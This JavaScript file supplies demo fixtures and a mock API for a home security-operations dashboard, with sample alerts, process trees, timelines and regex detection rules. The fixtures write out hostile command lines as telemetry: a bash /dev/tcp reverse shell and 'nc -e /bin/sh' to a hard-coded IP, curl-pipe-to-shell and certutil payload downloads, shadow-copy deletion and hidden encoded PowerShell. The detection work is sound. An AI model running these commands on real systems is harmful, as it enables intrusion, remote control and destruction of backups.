// Seeded demo data + in-memory API stub for the HomeSOC dashboard preview.
// In-memory fixtures + a fetch-less API stub. Every call resolves from the data
// real render code in app.js runs unmodified against realistic data.

const T = () => Math.floor(Date.now() / 1000);
const mago = (m) => T() - m * 60;

const MOCK = {
  settings: { claude_enabled: true, claude_model: "claude-sonnet-4-6",
              claude_token_set: true, claude_token_masked: "sk-…a1f9" },
  devices: [
    { device_id: "d1", hostname: "ubuntu-web-01", platform: "linux",   ip: "10.20.4.11", last_seen: T() - 8,    online: true },
    { device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows", ip: "10.20.4.52", last_seen: T() - 15,   online: true },
    { device_id: "d3", hostname: "mbp-mthomas",   platform: "darwin",  ip: "10.20.4.77", last_seen: T() - 26,   online: true },
    { device_id: "d4", hostname: "win-srv-dc1",   platform: "windows", ip: "10.20.4.10", last_seen: T() - 11,   online: true },
    { device_id: "d5", hostname: "jenkins-ci",    platform: "linux",   ip: "10.20.4.30", last_seen: T() - 10800, online: false },
  ],
  alerts: [],
};

const C2 = "39.107.60.51";

function ev(base, extra) { return Object.assign({ ts: base }, extra); }

MOCK.alerts = [
  {
    id: "a1", ts: mago(2), rule_id: "lin-reverse-shell-devtcp",
    title: "Bash /dev/tcp reverse shell", severity: "critical",
    category: "process", mitre: ["T1059.004", "T1071.001"],
    device_id: "d1", hostname: "ubuntu-web-01", status: "new",
    event: ev(mago(2), {
      device_id: "d1", hostname: "ubuntu-web-01", platform: "linux",
      category: "process", action: "exec",
      process: { pid: 48213, ppid: 48190, name: "bash", exe: "/bin/bash",
        cmdline: "bash -i >& /dev/tcp/" + C2 + "/4444 0>&1",
        username: "www-data", parent_name: "python3" },
    }),
    story: {
      rule: {
        description: "Interactive bash redirected to a /dev/tcp socket — classic reverse shell.",
        match: [{ field: "process.cmdline", op: "regex", values: ["/dev/(tcp|udp)/", "bash\\s+-i"] }],
        references: ["https://attack.mitre.org/techniques/T1059/004/"],
      },
      process_tree: [
        { depth: 0, pid: 1188,  ppid: 1,     process_name: "nginx",   cmdline: "nginx: worker process", is_trigger: false },
        { depth: 1, pid: 48150, ppid: 1188,  process_name: "sh",      cmdline: "sh -c curl -s http://" + C2 + "/p.sh | sh", is_trigger: false },
        { depth: 2, pid: 48190, ppid: 48150, process_name: "python3", cmdline: "python3 -c \"import urllib.request,os;urllib.request.urlretrieve('http://" + C2 + "/stage2','/tmp/.s')\"", is_trigger: false },
        { depth: 3, pid: 48213, ppid: 48190, process_name: "bash",    cmdline: "bash -i >& /dev/tcp/" + C2 + "/4444 0>&1", is_trigger: true },
        { depth: 4, pid: 48230, ppid: 48213, process_name: "nc",      cmdline: "nc -e /bin/sh " + C2 + " 4444", is_trigger: false },
      ],
      timeline: [
        { category: "auth",    action: "login",  ts: mago(6), summary: "success ssh user=deploy from=10.20.4.5" },
        { category: "process", action: "exec",   ts: mago(3), summary: "curl :: curl -s http://" + C2 + "/p.sh" },
        { category: "file",    action: "create", ts: mago(3), summary: "create /tmp/p.sh" },
        { category: "network", action: "connect",ts: mago(3), summary: "python3 -> " + C2 + ":80 tcp ESTABLISHED" },
        { category: "process", action: "exec",   ts: mago(2), summary: "bash :: bash -i >& /dev/tcp/" + C2 + "/4444 0>&1", is_trigger: true },
        { category: "network", action: "connect",ts: mago(2), summary: "bash -> " + C2 + ":4444 tcp ESTABLISHED" },
        { category: "process", action: "exec",   ts: mago(1), summary: "nc :: nc -e /bin/sh " + C2 + " 4444" },
      ],
      behavioral:
"Assessment\nHigh-confidence interactive reverse shell from the web-server service account (www-data) to an external host. Pattern is consistent with successful exploitation of the public-facing nginx workload followed by second-stage retrieval and an outbound C2 session.\n\nConfirmed facts\n- www-data executed `bash -i` redirected to /dev/tcp/" + C2 + "/4444 (pid 48213, parent python3 48190).\n- An ESTABLISHED TCP session from python3 (48190) to " + C2 + ":80 precedes the exec; a second session to :4444 coincides with it.\n- The lineage originates under nginx worker 1188 via `sh -c curl … | sh`.\n- /tmp/p.sh was created ~40s before the bash exec; a child `nc -e /bin/sh` followed.\n\nInference / hypotheses\n- The curl|sh + python3 stages indicate a downloader pulling tooling from the same IP before the shell.\n- " + C2 + ":4444 is the likely interactive C2 listener; :80 the staging channel.\n\nBenign explanations\n- Low likelihood. A scripted admin task could match curl|sh, but an interactive bash to /dev/tcp under www-data is not normal for a service account that should not have a shell.\n\nSuggested next steps\n- Capture the live socket and process before they exit: `ss -tnp`, `/proc/48213/{cmdline,exe,fd}`; preserve /tmp/p.sh and the python3 args.\n- Pull nginx access/error logs around T-2m for the initiating request.\n- Sweep egress for other hosts beaconing to " + C2 + " and block at the perimeter.\n- Review www-data recent file writes and crontab.\n\nConfidence: High — process lineage, two network sessions, and a dropped file independently converge on the same external IP within a tight window.",
    },
  },
  {
    id: "a2", ts: mago(9), rule_id: "win-vssadmin-delete-shadows",
    title: "Volume shadow copies deleted", severity: "critical",
    category: "process", mitre: ["T1490"],
    device_id: "d4", hostname: "win-srv-dc1", status: "new",
    event: ev(mago(9), {
      device_id: "d4", hostname: "win-srv-dc1", platform: "windows",
      category: "process", action: "exec",
      process: { pid: 6620, ppid: 6440, name: "vssadmin.exe",
        exe: "C:\\Windows\\System32\\vssadmin.exe",
        cmdline: "vssadmin delete shadows /all /quiet",
        username: "NT AUTHORITY\\SYSTEM", parent_name: "cmd.exe" },
    }),
    story: {
      rule: {
        description: "vssadmin/wmic deleting shadow copies — common pre-ransomware step.",
        match: [{ field: "process.cmdline", op: "regex", values: ["vssadmin\\s+delete\\s+shadows", "shadowcopy\\s+delete", "wbadmin\\s+delete\\s+catalog"] }],
        references: ["https://attack.mitre.org/techniques/T1490/"],
      },
      process_tree: [
        { depth: 0, pid: 6210, ppid: 1, process_name: "powershell.exe", cmdline: "powershell -nop -w hidden -enc UwB0AG8AcAAtAFMAZQByAHYAaQBjAGUA...", is_trigger: false },
        { depth: 1, pid: 6440, ppid: 6210, process_name: "cmd.exe", cmdline: "cmd /c vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet", is_trigger: false },
        { depth: 2, pid: 6620, ppid: 6440, process_name: "vssadmin.exe", cmdline: "vssadmin delete shadows /all /quiet", is_trigger: true },
      ],
      timeline: [
        { category: "process", action: "exec", ts: mago(11), summary: "powershell.exe :: -nop -w hidden -enc UwB0AG8A…" },
        { category: "process", action: "exec", ts: mago(9), summary: "cmd.exe :: cmd /c vssadmin delete shadows /all /quiet" },
        { category: "process", action: "exec", ts: mago(9), summary: "vssadmin.exe :: vssadmin delete shadows /all /quiet", is_trigger: true },
        { category: "process", action: "exec", ts: mago(8), summary: "wbadmin.exe :: wbadmin delete catalog -quiet" },
      ],
    },
  },
  {
    id: "a3", ts: mago(22), rule_id: "win-powershell-encoded",
    title: "PowerShell encoded command", severity: "high",
    category: "process", mitre: ["T1059.001", "T1027"],
    device_id: "d2", hostname: "DESKTOP-7F2A1", status: "investigating",
    event: ev(mago(22), {
      device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows",
      category: "process", action: "exec",
      process: { pid: 9120, ppid: 8804, name: "powershell.exe",
        exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        username: "CORP\\m.thomas", parent_name: "WINWORD.EXE" },
    }),
    story: {
      rule: {
        description: "powershell.exe launched with -EncodedCommand / -enc — common obfuscation.",
        match: [
          { field: "process.name", op: "in", values: ["powershell.exe", "pwsh.exe"] },
          { field: "process.cmdline", op: "regex", values: ["\\s-e(nc|ncodedcommand)?\\b\\s+[A-Za-z0-9+/=]{30,}"] },
        ],
        references: ["https://attack.mitre.org/techniques/T1059/001/"],
      },
      process_tree: [
        { depth: 0, pid: 7400, ppid: 1, process_name: "explorer.exe", cmdline: "C:\\Windows\\explorer.exe", is_trigger: false },
        { depth: 1, pid: 8804, ppid: 7400, process_name: "WINWORD.EXE", cmdline: "\"WINWORD.EXE\" /n C:\\Users\\m.thomas\\Downloads\\invoice_0624.docm", is_trigger: false },
        { depth: 2, pid: 9120, ppid: 8804, process_name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…", is_trigger: true },
      ],
      timeline: [
        { category: "file",    action: "create", ts: mago(24), summary: "create C:\\Users\\m.thomas\\Downloads\\invoice_0624.docm" },
        { category: "process", action: "exec",   ts: mago(23), summary: "WINWORD.EXE :: /n …\\invoice_0624.docm" },
        { category: "process", action: "exec",   ts: mago(22), summary: "powershell.exe :: -nop -w hidden -enc SQBFAFgA…", is_trigger: true },
        { category: "network", action: "connect",ts: mago(22), summary: "powershell.exe -> " + C2 + ":443 tcp ESTABLISHED" },
      ],
    },
  },
  {
    id: "a4", ts: mago(2), rule_id: "net-shell-egress",
    title: "Interpreter making external connection", severity: "high",
    category: "network", mitre: ["T1071", "T1059"],
    device_id: "d1", hostname: "ubuntu-web-01", status: "new",
    event: ev(mago(2), {
      device_id: "d1", hostname: "ubuntu-web-01", platform: "linux",
      category: "network", action: "connect",
      network: { laddr: "10.20.4.11", lport: 51544, raddr: C2, rport: 80,
        proto: "tcp", status: "ESTABLISHED", pid: 48190, process_name: "python3" },
    }),
    story: {
      rule: {
        description: "A shell/interpreter process connecting to a public IP — possible C2/egress.",
        match: [
          { field: "network.process_name", op: "in", values: ["bash", "sh", "python", "python3", "powershell.exe", "cmd.exe", "nc"] },
          { field: "network.raddr", op: "ip_public" },
        ],
        references: [],
      },
      process_tree: [
        { depth: 0, pid: 48150, ppid: 1188,  process_name: "sh",      cmdline: "sh -c curl -s http://" + C2 + "/p.sh | sh", is_trigger: false },
        { depth: 1, pid: 48190, ppid: 48150, process_name: "python3", cmdline: "python3 -c \"import urllib.request…\"", is_trigger: true },
      ],
      timeline: [
        { category: "process", action: "exec",   ts: mago(3), summary: "python3 :: import urllib.request…" },
        { category: "network", action: "connect",ts: mago(2), summary: "python3 -> " + C2 + ":80 tcp ESTABLISHED", is_trigger: true },
        { category: "network", action: "connect",ts: mago(2), summary: "bash -> " + C2 + ":4444 tcp ESTABLISHED" },
      ],
    },
  },
  {
    id: "a5", ts: mago(35), rule_id: "win-certutil-download",
    title: "certutil used to download a file", severity: "high",
    category: "process", mitre: ["T1105", "T1218"],
    device_id: "d2", hostname: "DESKTOP-7F2A1", status: "new",
    event: ev(mago(35), {
      device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows",
      category: "process", action: "exec",
      process: { pid: 9540, ppid: 9120, name: "certutil.exe",
        exe: "C:\\Windows\\System32\\certutil.exe",
        cmdline: "certutil.exe -urlcache -split -f http://" + C2 + "/a.exe C:\\Users\\Public\\a.exe",
        username: "CORP\\m.thomas", parent_name: "powershell.exe" },
    }),
    story: {
      rule: {
        description: "certutil -urlcache/-f used as a LOLBIN downloader.",
        match: [
          { field: "process.name", op: "equals", value: "certutil.exe" },
          { field: "process.cmdline", op: "regex", values: ["-urlcache", "-f\\b.*http"] },
        ],
        references: ["https://attack.mitre.org/techniques/T1105/"],
      },
      process_tree: [
        { depth: 0, pid: 8804, ppid: 7400, process_name: "WINWORD.EXE", cmdline: "\"WINWORD.EXE\" /n …invoice_0624.docm", is_trigger: false },
        { depth: 1, pid: 9120, ppid: 8804, process_name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc …", is_trigger: false },
        { depth: 2, pid: 9540, ppid: 9120, process_name: "certutil.exe", cmdline: "certutil.exe -urlcache -split -f http://" + C2 + "/a.exe C:\\Users\\Public\\a.exe", is_trigger: true },
      ],
      timeline: [
        { category: "process", action: "exec",   ts: mago(36), summary: "powershell.exe :: -nop -w hidden -enc …" },
        { category: "process", action: "exec",   ts: mago(35), summary: "certutil.exe :: -urlcache -split -f http://" + C2 + "/a.exe", is_trigger: true },
        { category: "file",    action: "create", ts: mago(35), summary: "create C:\\Users\\Public\\a.exe" },
      ],
    },
  },
  {
    id: "a6", ts: mago(50), rule_id: "mac-launch-persistence",
    title: "LaunchAgent / LaunchDaemon plist written", severity: "medium",
    category: "file", mitre: ["T1543.001"],
    device_id: "d3", hostname: "mbp-mthomas", status: "new",
    event: ev(mago(50), {
      device_id: "d3", hostname: "mbp-mthomas", platform: "darwin",
      category: "file", action: "create",
      file: { path: "/Users/mthomas/Library/LaunchAgents/com.apple.softwareupdated.plist",
              name: "com.apple.softwareupdated.plist" },
    }),
    story: {
      rule: {
        description: "New/modified plist under LaunchAgents or LaunchDaemons — persistence.",
        match: [
          { field: "file.path", op: "regex", values: ["/Library/LaunchAgents/", "/Library/LaunchDaemons/"] },
          { field: "action", op: "in", values: ["create", "modify", "move"] },
        ],
        references: ["https://attack.mitre.org/techniques/T1543/001/"],
      },
      process_tree: [],
      timeline: [
        { category: "process", action: "exec",   ts: mago(51), summary: "curl :: curl -fsSL http://" + C2 + "/upd -o /tmp/.upd" },
        { category: "file",    action: "create", ts: mago(50), summary: "create …/LaunchAgents/com.apple.softwareupdated.plist", is_trigger: true },
        { category: "process", action: "exec",   ts: mago(49), summary: "launchctl :: launchctl load -w …softwareupdated.plist" },
      ],
    },
  },
  {
    id: "a8", ts: mago(80), rule_id: "win-recon-domain",
    title: "Domain/privilege reconnaissance", severity: "low",
    category: "process", mitre: ["T1033", "T1087", "T1018"],
    device_id: "d2", hostname: "DESKTOP-7F2A1", status: "new",
    event: ev(mago(80), {
      device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows",
      category: "process", action: "exec",
      process: { pid: 9980, ppid: 9120, name: "cmd.exe", exe: "C:\\Windows\\System32\\cmd.exe",
        cmdline: "cmd.exe /c whoami /all & net user & net group \"Domain Admins\" /domain",
        username: "CORP\\m.thomas", parent_name: "powershell.exe" },
    }),
    story: {
      rule: {
        description: "High-signal discovery: DC listing, Domain Admins enumeration, or whoami /all|/priv.",
        match: [{ field: "process.cmdline", op: "regex", values: ["nltest\\s+/dclist", "net\\s+group\\s+\"?domain admins", "net\\s+group\\s+.*/domain", "whoami\\s+/all", "whoami\\s+/priv"] }],
        references: [],
      },
      process_tree: [
        { depth: 0, pid: 9120, ppid: 8804, process_name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc …", is_trigger: false },
        { depth: 1, pid: 9980, ppid: 9120, process_name: "cmd.exe", cmdline: "cmd.exe /c whoami /all & net user & net group \"Domain Admins\" /domain", is_trigger: true },
      ],
      timeline: [
        { category: "process", action: "exec", ts: mago(80), summary: "cmd.exe :: whoami /all & net user & net group …", is_trigger: true },
      ],
    },
  },
  {
    id: "a10", ts: mago(180), rule_id: "win-schtasks-suspicious",
    title: "Scheduled task running a suspicious payload", severity: "medium",
    category: "process", mitre: ["T1053.005"],
    device_id: "d4", hostname: "win-srv-dc1", status: "new",
    event: ev(mago(180), {
      device_id: "d4", hostname: "win-srv-dc1", platform: "windows",
      category: "process", action: "exec",
      process: { pid: 7010, ppid: 6440, name: "schtasks.exe", exe: "C:\\Windows\\System32\\schtasks.exe",
        cmdline: "schtasks /create /tn \"Updater\" /tr \"powershell -nop -w hidden -enc …\" /sc minute /mo 5 /ru SYSTEM",
        username: "NT AUTHORITY\\SYSTEM", parent_name: "cmd.exe" },
    }),
    story: {
      rule: {
        description: "schtasks /create whose action is an interpreter/LOLBIN/URL or a temp-path binary.",
        match: [
          { field: "process.name", op: "equals", value: "schtasks.exe" },
          { field: "process.cmdline", op: "contains", value: "/create" },
          { field: "process.cmdline", op: "regex", values: ["powershell", "cmd\\s+/c", "-e(nc|ncodedcommand)?\\b", "https?://", "%temp%", "%appdata%"] },
        ],
        references: ["https://attack.mitre.org/techniques/T1053/005/"],
      },
      process_tree: [
        { depth: 0, pid: 6440, ppid: 6210, process_name: "cmd.exe", cmdline: "cmd /c schtasks /create …", is_trigger: false },
        { depth: 1, pid: 7010, ppid: 6440, process_name: "schtasks.exe", cmdline: "schtasks /create /tn \"Updater\" /tr \"powershell …\" /sc minute /mo 5 /ru SYSTEM", is_trigger: true },
      ],
      timeline: [
        { category: "process", action: "exec", ts: mago(180), summary: "schtasks.exe :: /create /tn Updater /sc minute /mo 5", is_trigger: true },
      ],
    },
  },
];

function _iso(ts) {
  return new Date(ts * 1000).toISOString().replace(/\.\d+Z$/, "Z");
}

function _counts() {
  const c = {};
  for (const a of MOCK.alerts) if (a.status !== "resolved") c[a.severity] = (c[a.severity] || 0) + 1;
  return c;
}

function _genAnalysis(a) {
  const host = a.hostname, m = (a.mitre || []).join(", ") || "n/a";
  return (
"Assessment\nSignature `" + a.rule_id + "` fired on " + host + ". Treat as a lead to corroborate, not a verdict on its own.\n\n" +
"Confirmed facts\n- " + a.title + " observed on " + host + " at " + _iso(a.ts) + ".\n- MITRE mapping: " + m + ".\n\n" +
"Inference / hypotheses\n- The activity is consistent with the technique above, but intent is not established from this event alone.\n\n" +
"Benign explanations\n- Could be administrative or tooling activity; validate the responsible account and parent process before escalating.\n\n" +
"Suggested next steps\n- Pull the surrounding process/file/network/auth telemetry on " + host + " for the same window.\n- Confirm whether the parent process and user are expected on this host.\n\n" +
"Confidence: Medium — single high-signal event; corroboration pending.");
}

// ---- rules: seeded built-ins (injected at build time) + in-memory custom ----
const SEED_RULES = (window.__SEED_RULES || []).map((r) => Object.assign({ source: "builtin", enabled: true }, r));
let CUSTOM_RULES = [
  { source: "custom", enabled: true, id: "custom-aws-key-in-cmdline",
    title: "AWS access key id on a command line", severity: "high", category: "process",
    platform: [], mitre: ["T1552.001"],
    description: "Hardcoded AKIA… credential passed as a process argument.", references: [],
    match: [{ field: "process.cmdline", op: "regex", values: ["AKIA[0-9A-Z]{16}"] }] },
];
function ruleListing() { return SEED_RULES.map((r) => ({ ...r })).concat(CUSTOM_RULES.map((r) => ({ ...r }))); }
function activeRuleCount() { return SEED_RULES.length + CUSTOM_RULES.filter((r) => r.enabled).length; }

// JS port of the server's operator set (so Validate / Test work offline)
function _ip4(s) { const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(String(s || "")); if (!m) return null; const o = m.slice(1).map(Number); if (o.some((x) => x > 255)) return null; return ((o[0] << 24) >>> 0) + (o[1] << 16) + (o[2] << 8) + o[3]; }
function _inR(n, a, b) { return n >= _ip4(a) && n <= _ip4(b); }
function _isPriv(s) { const n = _ip4(s); if (n === null) return false; return _inR(n,"10.0.0.0","10.255.255.255")||_inR(n,"172.16.0.0","172.31.255.255")||_inR(n,"192.168.0.0","192.168.255.255")||_inR(n,"127.0.0.0","127.255.255.255")||_inR(n,"169.254.0.0","169.254.255.255"); }
function _isPub(s) { const n = _ip4(s); if (n === null || _isPriv(s)) return false; if (_inR(n,"224.0.0.0","239.255.255.255")||_inR(n,"0.0.0.0","0.255.255.255")||_inR(n,"240.0.0.0","255.255.255.255")) return false; if (_inR(n,"192.0.2.0","192.0.2.255")||_inR(n,"198.51.100.0","198.51.100.255")||_inR(n,"203.0.113.0","203.0.113.255")) return false; return true; }
function _inCidr(s, cidr) { const n = _ip4(s); if (n === null) return false; const [ip, bitsS] = String(cidr).split("/"); const base = _ip4(ip); if (base === null) return false; const bits = bitsS === undefined ? 32 : parseInt(bitsS, 10); const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0; return ((n & mask) >>> 0) === ((base & mask) >>> 0); }
function _nrm(v, cs) { const s = v == null ? "" : String(v); return cs ? s : s.toLowerCase(); }
function _gf(ev, f) { let c = ev; for (const p of String(f).split(".")) { if (c && typeof c === "object") c = c[p]; else return undefined; } return c; }
function evalCond(c, ev) {
  const op = (c.op || "equals").toLowerCase(), cs = !!c.case_sensitive, actual = _gf(ev, c.field);
  const vals = c.values || (c.value != null ? [c.value] : []);
  if (op === "exists") return actual != null;
  if (op === "not_exists") return actual == null;
  if (op === "equals") return _nrm(actual, cs) === _nrm(c.value, cs);
  if (op === "not_equals") return _nrm(actual, cs) !== _nrm(c.value, cs);
  if (op === "in") return vals.map((x) => _nrm(x, cs)).includes(_nrm(actual, cs));
  if (op === "not_in") return !vals.map((x) => _nrm(x, cs)).includes(_nrm(actual, cs));
  const a = _nrm(actual, cs);
  if (op === "contains") return a.includes(_nrm(c.value, cs));
  if (op === "contains_any") return vals.some((x) => a.includes(_nrm(x, cs)));
  if (op === "contains_all") return vals.every((x) => a.includes(_nrm(x, cs)));
  if (op === "startswith") return vals.some((x) => a.startsWith(_nrm(x, cs)));
  if (op === "endswith") return vals.some((x) => a.endsWith(_nrm(x, cs)));
  if (op === "regex") { const fl = cs ? "" : "i"; return vals.some((p) => { try { return new RegExp(p, fl).test(String(actual == null ? "" : actual)); } catch (e) { return false; } }); }
  if (["gt","lt","gte","lte"].includes(op)) { const an = parseFloat(actual), vn = parseFloat(c.value); if (isNaN(an) || isNaN(vn)) return false; return op === "gt" ? an > vn : op === "lt" ? an < vn : op === "gte" ? an >= vn : an <= vn; }
  if (op === "ip_public") return _isPub(actual);
  if (op === "ip_private") return _isPriv(actual);
  if (op === "ip_in") return vals.some((x) => _inCidr(actual, x));
  if (op === "ip_not_in") return !vals.some((x) => _inCidr(actual, x));
  return false;
}
function ruleMatches(defn, ev) {
  if (defn.category && ev.category !== defn.category) return false;
  if (defn.platform && defn.platform.length && !defn.platform.includes(ev.platform)) return false;
  const match = (defn.detection && defn.detection.match) || [];
  if (!match.length) return false;
  return match.every((c) => evalCond(c, ev));
}
function validateDef(defn, sample) {
  const match = (defn.detection && defn.detection.match) || [];
  if (!match.length) return { valid: false, error: "rule has empty detection.match", matched: null };
  for (const c of match) {
    const op = (c.op || "equals").toLowerCase();
    if (!c.field && !["exists", "not_exists"].includes(op)) return { valid: false, error: "every condition needs a 'field'", matched: null };
    if (op === "regex") { const vals = c.values || (c.value != null ? [c.value] : []); for (const p of vals) { try { new RegExp(p); } catch (e) { return { valid: false, error: "invalid regex " + JSON.stringify(p) + ": " + e.message, matched: null }; } } }
  }
  let matched = null;
  if (sample != null) { try { matched = ruleMatches(defn, sample); } catch (e) { return { valid: false, error: "evaluation error: " + e.message, matched: null }; } }
  return { valid: true, error: null, matched };
}
function slugRule(s) { s = String(s || "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, ""); return s || "rule"; }

// --- the stub the dashboard calls instead of fetch() ---------------------
window.__HOMESOC_MOCK_API = function (path, opts) {
  const method = (opts && opts.method) || "GET";
  const url = new URL(path, "http://x");
  const p = url.pathname;

  const reply = (data) => new Promise((res) => setTimeout(() => res(data), 80));

  if (p === "/api/stats")
    return reply({ alerts: _counts(), devices: MOCK.devices.length, rules: activeRuleCount() });
  if (p === "/api/devices")
    return reply(MOCK.devices.map((d) => Object.assign({}, d, { online: T() - d.last_seen < 120 })));
  if (p === "/api/settings" && method === "GET")
    return reply(MOCK.settings);
  if (p === "/api/settings" && method === "POST") {
    const body = JSON.parse((opts && opts.body) || "{}");
    if (body.claude_enabled != null) MOCK.settings.claude_enabled = body.claude_enabled;
    if (body.claude_model) MOCK.settings.claude_model = body.claude_model;
    if (body.claude_token) { MOCK.settings.claude_token_set = true; MOCK.settings.claude_token_masked = "sk-…" + body.claude_token.slice(-4); }
    return reply(MOCK.settings);
  }
  if (p === "/api/alerts" && method === "GET") {
    const st = url.searchParams.get("status"), sv = url.searchParams.get("severity");
    let rows = MOCK.alerts.slice().sort((a, b) => b.ts - a.ts);
    if (st) rows = rows.filter((a) => a.status === st);
    if (sv) rows = rows.filter((a) => a.severity === sv);
    return reply(rows.map(({ story, ...rest }) => rest));
  }
  const mStory = p.match(/^\/api\/alerts\/([^/]+)$/);
  if (mStory && method === "GET") {
    const a = MOCK.alerts.find((x) => x.id === mStory[1]);
    if (!a) return Promise.reject(new Error("not found"));
    const tl = a.story.timeline.map((e) => Object.assign({ id: Math.random().toString(36).slice(2),
      ts_iso: _iso(e.ts) }, e));
    return reply({
      alert: { ...a, behavioral: a.story.behavioral || null },
      device: MOCK.devices.find((d) => d.device_id === a.device_id) || {},
      rule: Object.assign({ id: a.rule_id, title: a.title, severity: a.severity, mitre: a.mitre }, a.story.rule),
      process_tree: a.story.process_tree,
      timeline: tl,
      behavioral: a.story.behavioral || null,
      story_note: "Lineage and timeline are reconstructed from polled telemetry and may be partial; short-lived activity between samples can be missing. (Seeded demo data.)",
    });
  }
  const mStatus = p.match(/^\/api\/alerts\/([^/]+)\/status$/);
  if (mStatus && method === "POST") {
    const status = JSON.parse(opts.body).status;
    const i = MOCK.alerts.findIndex((x) => x.id === mStatus[1]);
    if (i < 0) return Promise.reject(new Error("alert not found"));
    if (status === "resolved") { MOCK.alerts.splice(i, 1); return reply({ ok: true, deleted: true }); }
    MOCK.alerts[i].status = status;
    return reply({ ok: true, deleted: false });
  }
  const mAnalyze = p.match(/^\/api\/alerts\/([^/]+)\/analyze$/);
  if (mAnalyze && method === "POST") {
    const a = MOCK.alerts.find((x) => x.id === mAnalyze[1]);
    if (!a) return Promise.reject(new Error("not found"));
    const text = a.story.behavioral || _genAnalysis(a);
    a.story.behavioral = text;
    return new Promise((res) => setTimeout(() => res({ behavioral: text }), 900));
  }
  if (p === "/api/rules" && method === "GET") {
    const rules = ruleListing();
    const by = {};
    rules.filter((r) => r.source === "builtin" || r.enabled).forEach((r) => { by[r.severity] = (by[r.severity] || 0) + 1; });
    return reply({ count: activeRuleCount(), by_severity: by, errors: [], rules });
  }
  if (p === "/api/rules/validate" && method === "POST") {
    const b = JSON.parse(opts.body);
    return reply(validateDef(b.definition, b.sample_event));
  }
  if (p === "/api/rules/custom" && method === "POST") {
    const b = JSON.parse(opts.body), defn = Object.assign({}, b.definition);
    let rid = slugRule(defn.id || defn.title || "");
    if (!rid.startsWith("custom-")) rid = "custom-" + rid;
    defn.id = rid;
    if (ruleListing().some((r) => r.id === rid)) return Promise.reject(new Error("a rule with id '" + rid + "' already exists"));
    const v = validateDef(defn);
    if (!v.valid) return Promise.reject(new Error(v.error));
    CUSTOM_RULES.push({ source: "custom", enabled: b.enabled !== false, id: rid,
      title: defn.title || rid, severity: defn.severity || "medium", category: defn.category || null,
      platform: defn.platform || [], mitre: defn.mitre || [], description: defn.description || "",
      references: defn.references || [], match: defn.detection.match });
    return reply({ id: rid });
  }
  const mcRule = p.match(/^\/api\/rules\/custom\/([^/]+)$/);
  if (mcRule && method === "PUT") {
    const b = JSON.parse(opts.body), defn = Object.assign({}, b.definition);
    defn.id = mcRule[1];
    const r = CUSTOM_RULES.find((x) => x.id === mcRule[1]);
    if (!r) return Promise.reject(new Error("custom rule not found"));
    const v = validateDef(defn);
    if (!v.valid) return Promise.reject(new Error(v.error));
    Object.assign(r, { title: defn.title || r.id, severity: defn.severity || "medium",
      category: defn.category || null, platform: defn.platform || [], mitre: defn.mitre || [],
      description: defn.description || "", references: defn.references || [],
      match: defn.detection.match, enabled: b.enabled !== false });
    return reply({ id: r.id });
  }
  if (mcRule && method === "DELETE") {
    const i = CUSTOM_RULES.findIndex((x) => x.id === mcRule[1]);
    if (i < 0) return Promise.reject(new Error("custom rule not found"));
    CUSTOM_RULES.splice(i, 1);
    return reply({ ok: true });
  }
  const mcTog = p.match(/^\/api\/rules\/custom\/([^/]+)\/toggle$/);
  if (mcTog && method === "POST") {
    const r = CUSTOM_RULES.find((x) => x.id === mcTog[1]);
    if (!r) return Promise.reject(new Error("custom rule not found"));
    r.enabled = JSON.parse(opts.body).enabled;
    return reply({ id: r.id, enabled: r.enabled });
  }
  return Promise.reject(new Error("mock: unhandled " + method + " " + p));
};
